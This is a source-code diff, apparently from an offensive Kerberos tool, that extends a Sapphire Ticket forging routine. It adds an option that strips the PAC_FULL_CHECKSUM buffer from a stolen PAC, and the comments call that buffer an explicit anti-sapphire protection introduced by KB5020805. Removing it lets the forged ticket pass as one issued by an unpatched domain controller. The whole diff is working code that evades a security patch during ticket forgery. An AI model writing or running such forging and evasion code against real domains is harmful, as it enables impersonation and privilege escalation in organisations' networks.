@@ -192,6 +192,12 @@ type SapphireTicketRequest struct {
 	// StripPACAttributes rewrites PAC_ATTRIBUTES_INFO.Flags from 0x2
 	// (PAC_WAS_GIVEN_IMPLICITLY, S4U2Self) to 0x1 (PAC_WAS_REQUESTED, AS-REQ).
 	StripPACAttributes bool
+
+	// StripFullChecksum removes the PAC_FULL_CHECKSUM buffer (type 19) from the
+	// PAC. This buffer was added in KB5020805 and is an explicit anti-sapphire
+	// measure. Removing it makes the PAC look like it came from a pre-KB5020805
+	// DC that doesn't emit the buffer at all.
+	StripFullChecksum bool
 }
 
 // SapphireTicketResult contains the Sapphire Ticket.
@@ -487,6 +493,21 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 			fmt.Printf("[+] Rewrote PAC_ATTRIBUTES_INFO flags in %d buffer(s)\n", n)
 		} else {
 			fmt.Println("[!] PAC_ATTRIBUTES_INFO flags already = 0x1 or buffer absent")
+		}
+	}
+
+	// Step 3.78: Optionally remove PAC_FULL_CHECKSUM (type 19) buffer.
+	// Added in KB5020805 (Nov 2022) as an explicit anti-sapphire measure.
+	// Removing makes the PAC look pre-KB5020805.
+	if req.StripFullChecksum {
+		fmt.Println("[*] Step 3.78: Removing PAC_FULL_CHECKSUM (type 19) buffer...")
+		before := len(stolenPAC)
+		var n int
+		stolenPAC, n = pac.RemovePACFullChecksum(stolenPAC)
+		if n > 0 {
+			fmt.Printf("[+] Removed PAC_FULL_CHECKSUM buffer (PAC size %d → %d)\n", before, len(stolenPAC))
+		} else {
+			fmt.Println("[!] No PAC_FULL_CHECKSUM buffer present (DC may pre-date KB5020805)")
 		}
 	}
 
